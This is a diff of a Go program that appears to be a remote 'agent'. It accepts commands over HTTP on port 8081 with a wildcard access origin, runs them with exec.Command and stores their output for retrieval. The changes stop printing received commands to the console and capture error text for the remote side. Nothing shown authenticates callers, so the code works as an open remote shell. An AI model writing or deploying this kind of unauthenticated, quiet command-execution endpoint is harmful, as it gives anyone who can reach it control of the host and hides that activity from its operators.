@@ -19,7 +19,7 @@ var port = 8081
 var AccessOrigin = "*"
 
 func GetAgentName() string{
-
+	// To be implemented
 	return "Agent1"
 }
 
@@ -42,13 +42,15 @@ func ExecuteCommand(command string){
 	if len(args) >= 1{
 		out, err := exec.Command(args[0],args[1:]...).Output()
 		if err != nil {
-			fmt.Println(err)
+			Data = append(Data,string(err.Error()))
+			return
 		}
 		Data = append(Data,string(out))
 	}else{
 		out, err := exec.Command(args[0]).Output()
 		if err != nil {
-			fmt.Println(err)
+			Data = append(Data,string(err.Error()))
+			return
 		}
 		Data = append(Data,string(out))
 	}
@@ -60,7 +62,6 @@ func ExecuteCommand(command string){
 func HandleCommands(commands []string){
 
 	for _, command := range commands{
-		fmt.Println(command)
 		ExecuteCommand(command)
 	}
 
@@ -76,6 +77,9 @@ func AddCommand(w http.ResponseWriter, r *http.Request){
 	HandleCommands(commands)
 	w.Write([]byte("OK"))
 }
+
+
+func OpenBrowser(){}
 
 func main()  {
 
